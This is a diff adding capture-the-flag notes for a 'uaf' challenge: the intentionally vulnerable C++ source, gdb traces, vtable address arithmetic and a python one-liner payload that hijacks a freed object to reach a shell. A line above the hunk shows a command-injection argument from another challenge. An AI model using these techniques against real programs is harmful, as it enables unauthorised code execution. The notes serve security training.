@@ -912,3 +912,175 @@ cmd2@ubuntu:/tmp/de$ ./cmd2 '$(echo "\56")$(echo "\57")cat lala'
 $(echo "\56")$(echo "\57")cat lala
 
 
+Toddler's Bottle - uaf
+
+#include <fcntl.h>
+#include <iostream>
+#include <cstring>
+#include <cstdlib>
+#include <unistd.h>
+using namespace std;
+
+class Human{
+private:
+	virtual void give_shell(){
+		system("/bin/sh");
+	}
+protected:
+	int age;
+	string name;
+public:
+	virtual void introduce(){
+		cout << "My name is " << name << endl;
+		cout << "I am " << age << " years old" << endl;
+	}
+};
+
+class Man: public Human{
+public:
+	Man(string name, int age){
+		this->name = name;
+		this->age = age;
+        }
+        virtual void introduce(){
+		Human::introduce();
+                cout << "I am a nice guy!" << endl;
+        }
+};
+
+class Woman: public Human{
+public:
+        Woman(string name, int age){
+                this->name = name;
+                this->age = age;
+        }
+        virtual void introduce(){
+                Human::introduce();
+                cout << "I am a cute girl!" << endl;
+        }
+};
+
+int main(int argc, char* argv[]){
+	Human* m = new Man("Jack", 25);
+	Human* w = new Woman("Jill", 21);
+
+	size_t len;
+	char* data;
+	unsigned int op;
+	while(1){
+		cout << "1. use\n2. after\n3. free\n";
+		cin >> op;
+
+		switch(op){
+			case 1:
+				m->introduce();
+				w->introduce();
+				break;
+			case 2:
+				len = atoi(argv[1]);
+				data = new char[len];
+				read(open(argv[2], O_RDONLY), data, len);
+				cout << "your data is allocated" << endl;
+				break;
+			case 3:
+				delete m;
+				delete w;
+				break;
+			default:
+				break;
+		}
+	}
+
+	return 0;
+}
+
+
+break 0x0000000000400ff6
+
+  0x0000000000400fd4 <+272>:	add    rax,0x8
+   0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
+   0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
+   0x0000000000400fdf <+283>:	mov    rdi,rax
+   0x0000000000400fe2 <+286>:	call   rdx
+   0x0000000000400fe4 <+288>:	mov    rax,QWORD PTR [rbp-0x30]
+   0x0000000000400fe8 <+292>:	mov    rax,QWORD PTR [rax]
+   0x0000000000400feb <+295>:	add    rax,0x8
+   0x0000000000400fef <+299>:	mov    rdx,QWORD PTR [rax]
+   0x0000000000400ff2 <+302>:	mov    rax,QWORD PTR [rbp-0x30]
+=> 0x0000000000400ff6 <+306>:	mov    rdi,rax
+   0x0000000000400ff9 <+309>:	call   rdx
+   0x0000000000400ffb <+311>:	jmp    0x4010a9 <main+485>
+
+(gdb) x/x $rbp-0x30
+0x7fff7dca55f0:	0x00b65090
+(gdb) x/x 0x00b65090
+0xb65090:	0x00401550
+(gdb) x/x 0x00401550
+0x401550 <_ZTV5Woman+16>:	0x0040117a
+
+$ bc
+bc 1.06
+Copyright 1991-1994, 1997, 1998, 2000 Free Software Foundation, Inc.
+This is free software with ABSOLUTELY NO WARRANTY.
+For details type `warranty'.
+obase=16
+ibase=16
+401550-8
+401548
+
+python -c 'print "\x48\x15\x40\x00\x00\x00\x00\x00"' > /tmp/des/f.txt
+
+(gdb) r 8 /tmp/des/f.txt
+(gdb) x/x $rbp-0x30
+0x7fff82c5ef60:	0x01efc090
+(gdb) x/x $rbp-0x38
+0x7fff82c5ef58:	0x01efc040
+(gdb) x/x 0x01efc090
+0x1efc090:	0x00401548
+(gdb) x/x 0x01efc040
+0x1efc040:	0x00000000
+
+Running 1 after sets 0x00000000 :(
+
+(gdb) r 8 /tmp/des/f.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/uaf/uaf 8 /tmp/des/f.txt
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7fff1bdc1000
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+
+Breakpoint 3, 0x0000000000400fd8 in main ()
+(gdb) x/x $rbp-0x30
+0x7fff1bc271e0:	0x023be090
+(gdb) x/x $rbp-0x38
+0x7fff1bc271d8:	0x023be040
+(gdb) x/x 0x023be090
+0x23be090:	0x00401548
+(gdb) x/x 0x023be040
+0x23be040:	0x00401548
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0000000000400fdf in main ()
+(gdb) c
+Continuing.
+$ shell :)
+
+
